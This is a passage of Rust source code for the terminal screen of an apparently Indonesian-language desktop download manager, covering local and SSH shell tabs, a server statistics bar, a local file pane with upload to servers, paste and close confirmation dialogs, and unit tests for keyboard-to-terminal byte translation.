    egui::Window::new(title.to_string()).title_bar(false).collapsible(false).resizable(false).anchor(egui::Align2::CENTER_CENTER, [0.0, 0.0]).fixed_size([width, 0.0])
}

fn dialog_frame(ctx: &egui::Context) -> egui::Frame {
    egui::Frame::window(&ctx.global_style()).fill(SURFACE).inner_margin(egui::Margin::same(22)).shadow(egui::epaint::Shadow { offset: [0, 8], blur: 24, spread: 0, color: egui::Color32::from_black_alpha(150) })
}

fn badge(ui: &mut egui::Ui, text: &str, fill: egui::Color32) {
    ui.label(RichText::new(format!(" {text} ")).font(theme::mono(10.0)).color(egui::Color32::WHITE).background_color(fill));
}

impl App {
    fn term_settings(&mut self) -> TermSettings {
        if self.terminal.settings.is_none() {
            self.terminal_reload_settings();
        }
        self.terminal.settings.clone().expect("loaded above")
    }

    /// Re-read the terminal settings (after the Settings screen saved them).
    pub(super) fn terminal_reload_settings(&mut self) {
        let db = self.manager.db();
        let get = |k: &str| db.read(|c| repo::get_setting(c, k)).ok().flatten();
        self.terminal.settings = Some(TermSettings::load(get));
    }

    /// Whether the terminal currently holds the keyboard (app shortcuts must stay out of the way).
    pub(super) fn terminal_captures_keyboard(&self) -> bool {
        !shortcuts_enabled(self.screen == Screen::Terminal, self.terminal.captured)
    }

    fn start_local_session(&self, kind: ShellKind, cwd: &Path) -> unduhkilat_core::Result<TermSession> {
        let io = spawn_local(ShellOptions { kind, cwd: cwd.to_path_buf(), cols: 100, rows: 30 })?;
        let ctx = self.ctx.clone();
        Ok(TermSession::start(io, 100, 30, SCROLLBACK, Arc::new(move || ctx.request_repaint()), &self.rt))
    }

    /// Open a tab with a local shell in `cwd`. `kind = None` uses the shell from Settings.
    pub fn open_local_terminal(&mut self, cwd: PathBuf, kind: Option<ShellKind>) {
        let settings = self.term_settings();
        let mut kind = kind.unwrap_or(settings.shell);
        if !detect_shells().contains(&kind) {
            kind = ShellKind::PowerShell;
        }
        match self.start_local_session(kind, &cwd) {
            Ok(session) => {
                let id = self.terminal.next_id;
                self.terminal.next_id += 1;
                let leaf = cwd.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_else(|| cwd.display().to_string());
                self.terminal.tabs.push(TermTab {
                    id,
                    base_title: leaf,
                    subtitle: cwd.display().to_string(),
                    kind: TabKind::Local(kind),
                    session: Some(session),
                    status: TabStatus::Running,
                    view: TerminalView::default(),
                    show_files: false,
                    files_dir: cwd.clone(),
                    cwd,
                    selected_files: Default::default(),
                    cancel: None,
                    explorer: None,
                    stats: None,
                });
                self.terminal.active = self.terminal.tabs.len() - 1;
                self.screen = Screen::Terminal;
            }
            Err(e) => self.notice = Some((e.message, Instant::now())),
        }
    }

    /// Open a tab with a shell on a saved server (SSH/SFTP), through its jump hosts. Nothing is
    /// contacted until this is called.
    pub fn open_ssh_terminal(&mut self, server_id: &str) {
        let Some(server) = self.servers.servers.iter().find(|s| s.id == server_id).cloned() else { return };
        let via: Vec<String> = server.hops.iter().map(|id| self.servers.servers.iter().find(|x| &x.id == id).map(|x| x.name.clone()).unwrap_or_else(|| "?".into())).collect();
        let (title, sub) = ssh_tab_labels(&server.name, &via);
        let id = self.terminal.next_id;
        self.terminal.next_id += 1;
        self.terminal.tabs.push(TermTab {
            id,
            base_title: title,
            subtitle: sub,
            kind: TabKind::Ssh { server_id: server.id.clone() },
            session: None,
            status: TabStatus::Connecting,
            view: TerminalView::default(),
            show_files: false,
            cwd: PathBuf::new(),
            files_dir: PathBuf::new(),
            selected_files: Default::default(),
            cancel: None,
            explorer: None,
            stats: None,
        });
        self.terminal.active = self.terminal.tabs.len() - 1;
        self.screen = Screen::Terminal;
        self.connect_ssh_tab(id);
    }

    /// (Re)connect an SSH tab. Only ever called from a button press: no automatic reconnecting.
    fn connect_ssh_tab(&mut self, tab_id: u64) {
        let Some(tab) = self.terminal.tabs.iter_mut().find(|t| t.id == tab_id) else { return };
        let TabKind::Ssh { server_id } = tab.kind.clone() else { return };
        let cancel = tokio_util::sync::CancellationToken::new();
        tab.cancel = Some(cancel.clone());
        tab.status = TabStatus::Connecting;
        tab.session = None;
        self.servers.shell_waiters.insert(tab_id);
        let stats = self.term_settings().server_stats;
        let (svc, tx, ctx) = (self.manager.servers(), self.tx.clone(), self.ctx.clone());
        let interact = Arc::new(super::servers::UiInteract { tx: tx.clone(), ctx: ctx.clone() });
        self.rt.spawn(async move {
            let result = svc.open_terminal(&server_id, interact, cancel, 100, 30, stats).await;
            let _ = tx.send(super::Msg::Servers(super::servers::ServersMsg::ShellReady { tab_id, result }));
            ctx.request_repaint();
        });
    }

    /// The connection attempt of an SSH tab finished.
    pub(super) fn terminal_ssh_ready(&mut self, tab_id: u64, result: unduhkilat_core::Result<OpenedTerminal>) {
        let Some(idx) = self.terminal.tabs.iter().position(|t| t.id == tab_id) else { return };
        match result {
            Ok(opened) => {
                let ctx = self.ctx.clone();
                let session = TermSession::start(opened.io, 100, 30, SCROLLBACK, Arc::new(move || ctx.request_repaint()), &self.rt);
                // New numbers arrive every few seconds even when the terminal is quiet: redraw for them.
                if let Some(mut rx) = opened.stats.clone() {
                    let ctx = self.ctx.clone();
                    self.rt.spawn(async move {
                        while rx.changed().await.is_ok() {
                            ctx.request_repaint();
                        }
                    });
                }
                let tab = &mut self.terminal.tabs[idx];
                tab.stats = opened.stats;
                tab.session = Some(session);
                tab.status = TabStatus::Running;
                tab.view = TerminalView::default();
            }
            Err(e) => self.terminal.tabs[idx].status = TabStatus::Failed(e.message),
        }
    }

    /// Per-frame housekeeping that must run even while another screen is showing: clipboard requests
    /// from programs (OSC 52) and session status.
    pub(super) fn terminal_sync(&mut self, ctx: &egui::Context) {
        for tab in &mut self.terminal.tabs {
            let Some(s) = &tab.session else { continue };
            for text in s.take_clipboard() {
                ctx.copy_text(text);
            }
            if let SessionStatus::Ended(code) = s.status() {
                tab.status = TabStatus::Ended(code);
            }
        }
    }

    fn request_close_tab(&mut self, id: u64) {
        let running = self.terminal.tabs.iter().find(|t| t.id == id).map(|t| matches!(t.status, TabStatus::Running | TabStatus::Connecting)).unwrap_or(false);
        if running {
            self.terminal.confirm_close = Some(id);
        } else {
            self.close_tab(id);
        }
    }

    fn close_tab(&mut self, id: u64) {
        if let Some(i) = self.terminal.tabs.iter().position(|t| t.id == id) {
            if let Some(c) = &self.terminal.tabs[i].cancel {
                c.cancel();
            }
            self.servers.shell_waiters.remove(&id);
            self.servers.shell_waiters.remove(&(id | super::explorer::EXPLORER_BIT));
            self.servers.shell_waiters.remove(&(id | super::explorer::LEFT_BIT));
            self.cleanup_pasted_images(id);
            if let Some(mut ex) = self.terminal.tabs[i].explorer.take() {
                ex.close(&self.rt);
            }
            if let Some(s) = &self.terminal.tabs[i].session {
                s.close();
            }
            self.terminal.tabs.remove(i);
            if self.terminal.active >= self.terminal.tabs.len() {
                self.terminal.active = self.terminal.tabs.len().saturating_sub(1);
            }
        }
    }

    pub(super) fn terminal_screen(&mut self, ui: &mut egui::Ui) {
        self.terminal.captured = false;
        if self.terminal.tabs.is_empty() {
            self.terminal.maximized = false;
        }
        let settings = self.term_settings();
        let mut select: Option<usize> = None;
        let mut close: Option<u64> = None;
        let mut new_tab: Option<ShellKind> = None;

        ui.horizontal_wrapped(|ui| {
            for (i, tab) in self.terminal.tabs.iter().enumerate() {
                let active = i == self.terminal.active;
                let label = tab_title(&tab.base_title, tab.session.as_ref().and_then(|s| s.title()).filter(|t| !t.to_ascii_lowercase().ends_with(".exe")).as_deref());
                egui::Frame::new().fill(if active { FG } else { SURFACE_RAISED }).stroke(egui::Stroke::new(1.0, BORDER)).corner_radius(6).inner_margin(egui::Margin::symmetric(8, 4)).show(ui, |ui| {
                    ui.horizontal(|ui| {
                        match &tab.kind {
                            TabKind::Local(_) => badge(ui, "LOKAL", egui::Color32::from_rgb(0x3A, 0x36, 0x32)),
                            TabKind::Ssh { .. } => badge(ui, "SSH", egui::Color32::from_rgb(0x6D, 0x4A, 0xFF)),
                            TabKind::Files { .. } => badge(ui, "BERKAS", egui::Color32::from_rgb(0x1F, 0x7A, 0x5A)),
                        }
                        let r = ui.add(egui::Label::new(RichText::new(label).color(if active { egui::Color32::WHITE } else { FG })).sense(egui::Sense::click()));
                        if r.clicked() {
                            select = Some(i);
                        }
                        let dot = match tab.status {
                            TabStatus::Running => SUCCESS,
                            TabStatus::Connecting => WARNING,
                            _ => DANGER,
                        };
                        ui.label(RichText::new("\u{25CF}").size(9.0).color(dot));
                        if ui.small_button("\u{00D7}").on_hover_text("Tutup tab").clicked() {
                            close = Some(tab.id);
                        }
                    });
                });
            }
            ui.menu_button("+ Baru", |ui| {
                for k in detect_shells() {
                    if ui.button(format!("Terminal baru: {}", k.label())).clicked() {
                        new_tab = Some(k);
                        ui.close();
                    }
                }
            });
        });
        ui.add_space(6.0);

        if let Some(i) = select {
            self.terminal.active = i;
        }
        if let Some(id) = close {
            self.request_close_tab(id);
        }
        if let Some(k) = new_tab {
            let dir = settings.start_dir.clone();
            self.open_local_terminal(dir, Some(k));
        }

        if self.terminal.tabs.is_empty() {
            ui.add_space(30.0);
            ui.vertical_centered(|ui| {
                ui.label(RichText::new("Belum ada terminal").font(theme::bold(16.0)));
                ui.label(RichText::new("Buka terminal di komputer ini, atau tekan Terminal pada kartu unduhan untuk membukanya di folder itu.").color(FG_SECONDARY));
                ui.add_space(8.0);
                if ui.add(primary_button("Terminal baru")).clicked() {
                    new_tab = Some(settings.shell);
                }
            });
            if let Some(k) = new_tab {
                self.open_local_terminal(settings.start_dir.clone(), Some(k));
            }
            return;
        }

        let idx = self.terminal.active.min(self.terminal.tabs.len() - 1);
        let mut outcome = TabOutcome::default();
        // The tab is taken out of the list while it draws, so the explorer pane can use `self`.
        let mut tab = self.terminal.tabs.remove(idx);
        let id = tab.id;
        let mut ex = tab.explorer.take();
        if ex.is_none() {
            if let TabKind::Ssh { server_id } | TabKind::Files { server_id } = &tab.kind {
                ex = Some(self.new_explorer(server_id));
            }
        }
        let maximized = self.terminal.maximized;
        let servers: Vec<(String, String)> = self.servers.servers.iter().map(|s| (s.id.clone(), s.name.clone())).collect();
        tab.view.alt_v_image = matches!(tab.kind, TabKind::Ssh { .. });
        draw_tab(ui, &mut tab, &settings, &servers, maximized, &mut outcome, &mut |ui: &mut egui::Ui| {
            if let Some(ex) = ex.as_mut() {
                self.explorer_ui(ui, id, ex);
            }
        });
        tab.explorer = ex;
        let paste_image = std::mem::take(&mut tab.view.image_requested);
        let ssh_server = if let TabKind::Ssh { server_id } = &tab.kind { Some(server_id.clone()) } else { None };
        self.terminal.tabs.insert(idx, tab);
        if let (true, Some(sid)) = (paste_image, ssh_server) {
            self.paste_clipboard_image(id, sid);
        }
        self.terminal.captured = self.terminal.tabs[idx].view.has_focus();
        if let Some(text) = outcome.paste_confirm {
            self.terminal.confirm_paste = Some((id, text));
        }
        if outcome.toggle_max {
            self.terminal.maximized = !self.terminal.maximized;
        }
        if let Some(n) = outcome.notice.take() {
            self.notice = Some((n, Instant::now()));
        }
        if outcome.reconnect {
            self.connect_ssh_tab(id);
            return;
        }
        if outcome.restart {
            let (kind, cwd) = match &self.terminal.tabs[idx].kind {
                TabKind::Local(k) => (*k, self.terminal.tabs[idx].cwd.clone()),
                TabKind::Ssh { .. } | TabKind::Files { .. } => return,
            };
            match self.start_local_session(kind, &cwd) {
                Ok(s) => {
                    let tab = &mut self.terminal.tabs[idx];
                    tab.session = Some(s);
                    tab.status = TabStatus::Running;
                    tab.view = TerminalView::default();
                }
                Err(e) => self.notice = Some((e.message, Instant::now())),
            }
        }
        if let Some((server_id, dir, names)) = outcome.upload.take() {
            self.upload_from_local(&server_id, dir, names);
        }
        if outcome.close {
            self.close_tab(id);
        }
    }

    /// Confirmation windows of the Terminal screen.
    pub(super) fn terminal_dialogs(&mut self, ctx: &egui::Context) {
        if let Some((tab_id, text)) = self.terminal.confirm_paste.clone() {
            let lines = text.lines().count();
            let mut answer: Option<bool> = None;
            dialog_window("Tempel teks", 520.0).frame(dialog_frame(ctx)).show(ctx, |ui| {
                ui.label(RichText::new(format!("Tempel {lines} baris?")).font(theme::bold(16.0)));
                ui.label(RichText::new("Program ini tidak meminta mode tempel aman, jadi setiap baris bisa langsung dijalankan sebagai perintah.").color(FG_SECONDARY));
                ui.add_space(6.0);
                let preview: String = text.lines().take(6).collect::<Vec<_>>().join("\n");
                ui.add(egui::TextEdit::multiline(&mut preview.clone()).font(theme::mono(11.5)).desired_rows(4).desired_width(f32::INFINITY));
                ui.add_space(8.0);
                ui.horizontal(|ui| {
                    if ui.add(primary_button("Tempel")).clicked() {
                        answer = Some(true);
                    }
                    if ui.button("Batal").clicked() {
                        answer = Some(false);
                    }
                });
            });
            if ctx.input(|i| i.key_pressed(egui::Key::Escape)) {
                answer = Some(false);
            }
            if let Some(yes) = answer {
                self.terminal.confirm_paste = None;
                if yes {
                    if let Some(s) = self.terminal.tabs.iter().find(|t| t.id == tab_id).and_then(|t| t.session.clone()) {
                        s.paste(text);
                    }
                }
            }
        }
        if let Some(id) = self.terminal.confirm_close {
            let mut answer: Option<bool> = None;
            dialog_window("Tutup tab", 440.0).frame(dialog_frame(ctx)).show(ctx, |ui| {
                ui.label(RichText::new("Tutup tab terminal ini?").font(theme::bold(16.0)));
                ui.label(RichText::new("Program yang masih berjalan di dalamnya akan dihentikan.").color(FG_SECONDARY));
                ui.add_space(8.0);
                ui.horizontal(|ui| {
                    if ui.add(egui::Button::new(RichText::new("Tutup").color(egui::Color32::WHITE).font(theme::bold(13.5))).fill(DANGER).stroke(egui::Stroke::NONE)).clicked() {
                        answer = Some(true);
                    }
                    if ui.button("Batal").clicked() {
                        answer = Some(false);
                    }
                });
            });
            if ctx.input(|i| i.key_pressed(egui::Key::Escape)) {
                answer = Some(false);
            }
            if let Some(yes) = answer {
                self.terminal.confirm_close = None;
                if yes {
                    self.close_tab(id);
                }
            }
        }
    }
}

#[derive(Default)]
struct TabOutcome {
    paste_confirm: Option<String>,
    restart: bool,
    reconnect: bool,
    toggle_max: bool,
    notice: Option<String>,
    close: bool,
    /// Upload these items of a local folder: (server id, folder, names).
    upload: Option<(String, PathBuf, Vec<String>)>,
}

/// One tab's toolbar, banner, terminal, and files pane, in the chosen layout.
fn draw_tab(ui: &mut egui::Ui, tab: &mut TermTab, settings: &TermSettings, servers: &[(String, String)], maximized: bool, out: &mut TabOutcome, explorer_ui: &mut dyn FnMut(&mut egui::Ui)) {
    let local = matches!(tab.kind, TabKind::Local(_));
    if matches!(tab.kind, TabKind::Files { .. }) {
        ui.horizontal(|ui| {
            ui.label(RichText::new(&tab.subtitle).font(theme::mono(11.5)).color(FG_SECONDARY));
            ui.with_layout(Layout::right_to_left(Align::Center), |ui| {
                let label = if maximized { "Keluar layar penuh" } else { "Layar penuh" };
                if ui.button(label).clicked() {
                    out.toggle_max = true;
                }
            });
        });
        ui.add_space(4.0);
        explorer_ui(ui);
        return;
    }
    ui.horizontal(|ui| {
        if settings.layout == TerminalLayout::A {
            ui.selectable_value(&mut tab.show_files, false, "Terminal");
            ui.selectable_value(&mut tab.show_files, true, "Berkas");
            ui.add_space(8.0);
        }
        if let TabKind::Local(k) = &tab.kind {
            ui.label(RichText::new(k.label()).font(theme::mono(11.5)).color(FG_SECONDARY));
        }
        ui.label(RichText::new(&tab.subtitle).font(theme::mono(11.5)).color(FG_SECONDARY));
        ui.with_layout(Layout::right_to_left(Align::Center), |ui| {
            let label = if maximized { "Keluar layar penuh" } else { "Layar penuh" };
            if ui.button(label).on_hover_text("Sembunyikan menu dan bilah lain agar terminal memenuhi jendela").clicked() {
                out.toggle_max = true;
            }
        });
    });
    match &tab.status {
        TabStatus::Ended(code) => {
            ui.horizontal(|ui| {
                let text = match (local, code) {
                    (false, _) => "Sambungan terputus.".to_string(),
                    (true, Some(c)) => format!("Berakhir (kode {c})."),
                    (true, None) => "Berakhir.".to_string(),
                };
                ui.label(RichText::new(text).color(DANGER));
                if local && ui.button("Mulai ulang").clicked() {
                    out.restart = true;
                }
                if !local && ui.button("Sambung ulang").clicked() {
                    out.reconnect = true;
                }
                if ui.button("Tutup").clicked() {
                    out.close = true;
                }
            });
        }
        TabStatus::Failed(msg) => {
            ui.horizontal(|ui| {
                ui.label(RichText::new(msg).color(DANGER));
                if ui.button("Coba lagi").clicked() {
                    out.reconnect = true;
                }
                if ui.button("Tutup").clicked() {
                    out.close = true;
                }
            });
        }
        TabStatus::Connecting => {
            ui.horizontal(|ui| {
                ui.label(RichText::new(format!("Menghubungkan lewat {}...", tab.subtitle)).color(FG_SECONDARY));
                if ui.button("Batal").clicked() {
                    out.close = true;
                }
            });
        }
        TabStatus::Running => {}
    }
    ui.add_space(4.0);

    let Some(session) = tab.session.clone() else { return };
    let (font, ctrl_v) = (settings.font_size, settings.ctrl_v_pastes);
    let show_terminal = |ui: &mut egui::Ui, tab: &mut TermTab, out: &mut TabOutcome| {
        let stats = match tab.stats.as_ref().map(|rx| rx.borrow().clone()) {
            Some(StatsState::Ready(s)) if tab.status == TabStatus::Running => Some(s),
            _ => None,
        };
        let avail = ui.available_size();
        let bar_h = if stats.is_some() { STATS_BAR_H } else { 0.0 };
        ui.allocate_ui_with_layout(Vec2::new(avail.x, (avail.y - bar_h).max(40.0)), Layout::top_down(Align::Min), |ui| {
            if let Some(text) = tab.view.show(ui, &session, font, ctrl_v) {
                out.paste_confirm = Some(text);
            }
        });
        if let Some(s) = stats {
            stats_bar(ui, &s);
        }
    };
    match settings.layout {
        TerminalLayout::A => {
            if tab.show_files {
                if local {
                    files_pane(ui, tab, &session, local, servers, out);
                } else {
                    explorer_ui(ui);
                }
            } else {
                show_terminal(ui, tab, out);
            }
        }
        TerminalLayout::B => {
            let total = ui.available_size();
            let left = (total.x * 0.64).floor();
            ui.horizontal_top(|ui| {
                ui.allocate_ui_with_layout(Vec2::new(left, total.y), Layout::top_down(Align::Min), |ui| show_terminal(ui, tab, out));
                ui.separator();
                ui.allocate_ui_with_layout(Vec2::new((total.x - left - 16.0).max(120.0), total.y), Layout::top_down(Align::Min), |ui| {
                    if local {
                        files_pane(ui, tab, &session, local, servers, out);
                    } else {
                        explorer_ui(ui);
                    }
                });
            });
        }
    }
}

const STATS_BAR_H: f32 = 24.0;

/// Text of each part of the server info bar, its hover explanation, and whether it needs attention.
pub fn stats_parts(s: &ServerStats) -> Vec<(String, &'static str, bool)> {
    let gb = |kb: u64| format!("{:.2} GB", kb as f64 / 1024.0 / 1024.0);
    let mut v = Vec::new();
    let cpu = s.cpu_pct.map(|p| format!("CPU {p:.0}%")).unwrap_or_else(|| "CPU \u{2026}".into());
    v.push((cpu, "Pemakaian CPU server selama beberapa detik terakhir", s.cpu_pct.map(|p| p >= 90.0).unwrap_or(false)));
    let mem_hot = s.mem_total_kb > 0 && s.mem_used_kb * 100 / s.mem_total_kb >= 90;
    v.push((format!("RAM {} / {}", gb(s.mem_used_kb), gb(s.mem_total_kb)), "Memori terpakai / total (cache yang bisa dilepas tidak dihitung)", mem_hot));
    let conns = if s.conns.is_empty() {
        "Koneksi: 0".to_string()
    } else {
        let parts: Vec<String> = s.conns.iter().take(3).map(|(p, n)| format!("{n} (port {p})")).collect();
        let more = if s.conns.len() > 3 { ", \u{2026}" } else { "" };
        format!("Koneksi: {}{more}", parts.join(", "))
    };
    v.push((conns, "Koneksi TCP tersambung ke port layanan yang didengarkan server", false));
    v.push((format!("Proses {}/{}", s.procs_running, s.procs_total), "Proses yang sedang berjalan / seluruh proses dan thread", false));
    v.push((format!("Uptime {}", unduhkilat_core::server::stats::format_uptime(s.uptime_secs)), "Lama server menyala sejak dinyalakan ulang", false));
    if !s.user.is_empty() {
        v.push((format!("{} (x{})", s.user, s.user_sessions.max(1)), "Pengguna Anda di server dan jumlah sesi login-nya", false));
    }
    if let Some(d) = s.disk_root_pct {
        v.push((format!("Disk /: {d}%"), "Isi sistem berkas / (root)", d >= 90));
    }
    v
}

/// The strip under an SSH terminal, like MobaXterm's.
fn stats_bar(ui: &mut egui::Ui, s: &ServerStats) {
    let (rect, _) = ui.allocate_exact_size(Vec2::new(ui.available_width(), STATS_BAR_H), Sense::hover());
    ui.painter().rect_filled(rect, 0.0, Color32::from_rgb(0x22, 0x1F, 0x1B));
    let mut child = ui.new_child(egui::UiBuilder::new().max_rect(rect.shrink2(Vec2::new(8.0, 0.0))).layout(Layout::left_to_right(Align::Center)));
    child.set_clip_rect(rect);
    child.spacing_mut().item_spacing.x = 6.0;
    let parts = stats_parts(s);
    let last = parts.len().saturating_sub(1);
    for (i, (text, hint, hot)) in parts.into_iter().enumerate() {
        let color = if hot { Color32::from_rgb(0xFF, 0x8A, 0x5B) } else { Color32::from_rgb(0xD8, 0xD2, 0xC9) };
        child.add(egui::Label::new(RichText::new(text).font(theme::mono(11.0)).color(color)).extend()).on_hover_text(hint);
        if i < last {
            child.label(RichText::new("\u{2502}").font(theme::mono(11.0)).color(Color32::from_rgb(0x5B, 0x55, 0x4E)));
        }
    }
}

/// Local folder listing next to (or instead of) the terminal. Servers get theirs with SFTP (a later part).
fn files_pane(ui: &mut egui::Ui, tab: &mut TermTab, session: &TermSession, local: bool, servers: &[(String, String)], out: &mut TabOutcome) {
    if !local {
        ui.add_space(20.0);
        ui.label(RichText::new("Segera hadir").font(theme::bold(14.0)));
        ui.label(RichText::new("Penjelajah berkas server menunggu dukungan SFTP.").color(FG_SECONDARY));
        return;
    }
    ui.horizontal(|ui| {
        if ui.small_button("\u{2191}").on_hover_text("Folder induk").clicked() {
            if let Some(p) = tab.files_dir.parent() {
                tab.files_dir = p.to_path_buf();
                tab.selected_files.clear();
            }
        }
        ui.label(RichText::new(tab.files_dir.display().to_string()).font(theme::mono(11.5)).color(FG_SECONDARY));
    });
    ui.add_space(4.0);
    let mut entries: Vec<(PathBuf, bool)> = std::fs::read_dir(&tab.files_dir)
        .map(|rd| rd.filter_map(|e| e.ok()).take(MAX_FILES).map(|e| (e.path(), e.file_type().map(|t| t.is_dir()).unwrap_or(false))).collect())
        .unwrap_or_default();
    entries.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.file_name().map(|n| n.to_ascii_lowercase()).cmp(&b.0.file_name().map(|n| n.to_ascii_lowercase()))));
    // Forget chosen items that are no longer in this folder (deleted or renamed outside the app).
    tab.selected_files.retain(|p| entries.iter().any(|(e, _)| e == p));
    let list_h = (ui.available_height() - 64.0).max(80.0);
    egui::ScrollArea::vertical().max_height(list_h).auto_shrink([false, false]).show(ui, |ui| {
        if entries.is_empty() {
            ui.label(RichText::new("Folder kosong.").color(FG_SECONDARY));
        }
        for (path, is_dir) in &entries {
            let name = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
            let selected = tab.selected_files.contains(path);
            let icon = if *is_dir { "\u{1F4C1}" } else { "\u{1F4C4}" };
            let r = ui.selectable_label(selected, format!("{icon} {name}"));
            let r = if *is_dir { r.on_hover_text("Klik dua kali untuk membuka folder") } else { r };
            // Same as the server explorer: one click chooses, a double click opens a folder.
            if r.double_clicked() && *is_dir {
                tab.files_dir = path.clone();
                tab.selected_files.clear();
                break;
            } else if r.clicked() {
                if ui.input(|i| i.modifiers.command) {
                    if !tab.selected_files.remove(path) {
                        tab.selected_files.insert(path.clone());
                    }
                } else {
                    tab.selected_files = [path.clone()].into();
                }
            }
        }
    });
    let chosen: Vec<String> = entries.iter().filter(|(p, _)| tab.selected_files.contains(p)).filter_map(|(p, _)| p.file_name().map(|n| n.to_string_lossy().into_owned())).collect();
    let dirs = entries.iter().filter(|(p, d)| *d && tab.selected_files.contains(p)).count();
    ui.label(RichText::new(super::explorer::selection_summary(dirs, chosen.len() - dirs)).color(FG_SECONDARY).small());
    ui.horizontal(|ui| {
        let can_cd = matches!(tab.kind, TabKind::Local(ShellKind::PowerShell | ShellKind::Cmd)) && session.status() == SessionStatus::Running;
        if ui.add_enabled(can_cd, egui::Button::new("Buka di terminal")).on_disabled_hover_text("Tersedia untuk PowerShell dan CMD yang sedang berjalan").clicked() {
            if let TabKind::Local(kind) = tab.kind {
                match cd_command(kind, &tab.files_dir.display().to_string()) {
                    Some(line) => {
                        session.send(line.into_bytes());
                        session.with_engine(|e| e.scroll_to_bottom());
                    }
                    None => out.notice = Some("Nama folder ini tidak aman diketik ke terminal; buka terminal baru di folder itu.".to_string()),
                }
            }
        }
        if ui.button("Folder Windows").clicked() {
            super::reveal_in_explorer(&tab.files_dir.display().to_string());
        }
        let hint = if servers.is_empty() { "Simpan server dulu di layar Server" } else { "Pilih berkas atau folder dulu (klik sekali; Ctrl+klik untuk beberapa)" };
        ui.add_enabled_ui(!chosen.is_empty() && !servers.is_empty(), |ui| {
            ui.menu_button("Unggah ke server\u{2026}", |ui| {
                for (id, name) in servers {
                    if ui.button(name).clicked() {
                        out.upload = Some((id.clone(), tab.files_dir.clone(), chosen.clone()));
                        ui.close();
                    }
                }
            })
            .response
            .on_disabled_hover_text(hint);
        });
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use eframe::egui::{Event, Key as K, Modifiers};
    use unduhkilat_core::term::engine::{MouseMode, TermModes};

    fn modes() -> TermModes {
        TermModes { alt_screen: false, bracketed_paste: false, app_cursor: false, app_keypad: false, mouse: MouseMode::Off, sgr_mouse: false, focus_events: false, kitty_disambiguate: false, alternate_scroll: false }
    }
    const NONE: Modifiers = Modifiers { alt: false, ctrl: false, shift: false, mac_cmd: false, command: false };
    const CTRL: Modifiers = Modifiers { alt: false, ctrl: true, shift: false, mac_cmd: false, command: true };
    const ALT: Modifiers = Modifiers { alt: true, ctrl: false, shift: false, mac_cmd: false, command: false };
    const SHIFT: Modifiers = Modifiers { alt: false, ctrl: false, shift: true, mac_cmd: false, command: false };
    const CTRL_SHIFT: Modifiers = Modifiers { alt: false, ctrl: true, shift: true, mac_cmd: false, command: true };

    fn key(k: K, m: Modifiers) -> Event {
        Event::Key { key: k, physical_key: None, pressed: true, repeat: false, modifiers: m }
    }
    fn ctx(mods: Modifiers) -> KeyContext {
        KeyContext { mods, insert_down: false, alt_v_image: false }
    }
    fn bytes(inputs: Vec<TermInput>) -> Vec<u8> {
        inputs.into_iter().flat_map(|i| match i { TermInput::Bytes(b) => b, other => panic!("unexpected {other:?}") }).collect()
    }
    fn tr(events: &[Event], m: Modifiers) -> Vec<TermInput> {
        translate_events(events, &modes(), false, true, &ctx(m))
    }

    #[test]
    fn text_and_emoji_become_utf8_bytes() {
        let out = bytes(tr(&[Event::Text("\u{e9}".into()), Event::Text("\u{1F600}".into()), Event::Text("\u{4F60}\u{597D}".into())], NONE));
        assert_eq!(out, "\u{e9}\u{1F600}\u{4F60}\u{597D}".as_bytes());
    }

    #[test]
    fn printable_key_events_are_not_sent_twice() {
        assert_eq!(bytes(tr(&[key(K::A, NONE), Event::Text("a".into())], NONE)), b"a");
        assert_eq!(bytes(tr(&[key(K::A, SHIFT), Event::Text("A".into())], SHIFT)), b"A");
        assert_eq!(bytes(tr(&[key(K::Space, NONE), Event::Text(" ".into())], NONE)), b" ");
    }

    #[test]
    fn ctrl_c_copies_only_with_a_selection() {
        assert_eq!(tr(&[Event::Copy], CTRL), vec![TermInput::Bytes(vec![3])], "no selection: the interrupt goes to the program");
        assert_eq!(translate_events(&[Event::Copy], &modes(), true, true, &ctx(CTRL)), vec![TermInput::Copy]);
    }

    #[test]
    fn ctrl_shift_c_and_ctrl_insert_always_copy() {
        assert_eq!(tr(&[Event::Copy], CTRL_SHIFT), vec![TermInput::Copy]);
        assert_eq!(translate_events(&[Event::Copy], &modes(), false, true, &KeyContext { mods: CTRL, insert_down: true, alt_v_image: false }), vec![TermInput::Copy]);
    }

    #[test]
    fn paste_event_becomes_paste() {
        assert_eq!(tr(&[Event::Paste("hi".into())], CTRL), vec![TermInput::Paste("hi".into())]);
        assert_eq!(tr(&[Event::Paste("hi".into())], SHIFT), vec![TermInput::Paste("hi".into())], "Shift+Insert");
    }

    #[test]
    fn ctrl_v_can_be_given_to_the_program() {
        let off = |m, insert| translate_events(&[Event::Paste("x".into())], &modes(), false, false, &KeyContext { mods: m, insert_down: insert, alt_v_image: false });
        assert_eq!(off(CTRL, false), vec![TermInput::Bytes(vec![0x16])], "plain Ctrl+V goes to the program when the setting is off");
        assert_eq!(off(CTRL_SHIFT, false), vec![TermInput::Paste("x".into())], "Ctrl+Shift+V always pastes");
        assert_eq!(off(SHIFT, true), vec![TermInput::Paste("x".into())], "Shift+Insert always pastes");
    }

    #[test]
    fn cut_is_ctrl_x() {
        assert_eq!(tr(&[Event::Cut], CTRL), vec![TermInput::Bytes(vec![0x18])]);
    }

    #[test]
    fn alt_letter_is_escape_prefixed_once() {
        assert_eq!(bytes(tr(&[key(K::X, ALT), Event::Text("x".into())], ALT)), b"\x1bx");
    }

    #[test]
    fn ctrl_letters_become_control_bytes() {
        assert_eq!(bytes(tr(&[key(K::L, CTRL)], CTRL)), [0x0c]);
        assert_eq!(bytes(tr(&[key(K::OpenBracket, CTRL)], CTRL)), [0x1b]);
        assert_eq!(bytes(tr(&[key(K::Space, CTRL)], CTRL)), [0x00]);
    }

    #[test]
    fn shift_enter_follows_kitty_mode() {
        let kitty = TermModes { kitty_disambiguate: true, ..modes() };
        assert_eq!(bytes(translate_events(&[key(K::Enter, SHIFT)], &kitty, false, true, &ctx(SHIFT))), b"\x1b[13;2u");
        assert_eq!(bytes(tr(&[key(K::Enter, SHIFT)], SHIFT)), b"\r");
    }

    #[test]
    fn arrows_and_function_keys() {
        assert_eq!(bytes(tr(&[key(K::ArrowUp, NONE)], NONE)), b"\x1b[A");
        let app = TermModes { app_cursor: true, ..modes() };
        assert_eq!(bytes(translate_events(&[key(K::ArrowUp, NONE)], &app, false, true, &ctx(NONE))), b"\x1bOA");
